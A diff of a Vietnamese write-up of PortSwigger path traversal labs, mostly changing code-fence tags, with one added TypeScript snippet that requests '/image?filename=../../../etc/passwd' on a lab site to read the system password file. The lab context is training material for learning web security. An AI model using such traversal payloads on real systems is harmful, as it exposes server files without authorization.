@@ -116,7 +116,7 @@ bài không có bất cứ một lớp phòng vệ nào để ngăn chặn Path 
 
 mình cũng đã viết lại script khai thác :100:
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -137,6 +137,20 @@ print(response.text) # hiển thị response có flag
 ```
 
 ![image](https://hackmd.io/_uploads/SkcpC3UFp.png)
+
+hoặc mình dùng code typescript
+
+```typescript!
+import axios from "axios";
+
+const url: string =
+  "https://0abf00f6049d30ab810485f100b800a0.web-security-academy.net";
+axios
+  .get(url + "/image?filename=../../../etc/passwd")
+  .then((response) => console.log(response.data));
+```
+
+![image](https://hackmd.io/_uploads/rys1ltWpp.png)
 
 mục đích của chúng ta đã hoàn thành và mình cũng đã giải được lab
 
@@ -214,7 +228,7 @@ và mình đã không đọc được file này như bài trước có vẻ như
 
 mình cũng đã viết lại script khai thác :100:
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -273,7 +287,7 @@ có vẻ là các ký tự '.\./' đã bị loại bỏ nhưng nếu tôi gấp 
 
 tôi đã viết lại script khai thác
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -337,7 +351,7 @@ vẫn chưa được mình thử encode lần nữa và may mắn là đã thàn
 
 mình đã viết lại script khai thác:
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -392,7 +406,7 @@ link: https://portswigger.net/web-security/file-path-traversal/lab-validate-star
 
 và mình cũng đã viết lại script
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -448,7 +462,7 @@ link: https://portswigger.net/web-security/file-path-traversal/lab-validate-file
 
 mình cũng viết lại script khai thác:
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
